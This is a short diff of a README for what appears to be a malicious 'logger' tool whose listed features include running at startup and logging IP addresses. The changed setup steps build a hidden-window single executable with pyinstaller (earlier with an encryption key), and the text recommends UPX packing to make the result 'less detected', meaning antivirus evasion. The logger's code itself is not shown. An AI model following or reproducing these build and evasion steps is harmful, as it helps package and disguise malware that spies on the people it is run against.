@@ -21,9 +21,9 @@ Sort of Fast
 Startup
 IP Logger
 Setup: Setup is really simple, it's like any other logger.
-´´pip install -r requirements.txt´´
-pyinstaller --clean --onefile --key <any key> fenty.py
+_pip install -r requirements.txt_
+_pyinstaller --onefile -w Dripple.py_
 
 virtualenv and UPX are recommended to make it smaller, faster, and less detected
 
-Enjoy :)
+# Enjoy :)
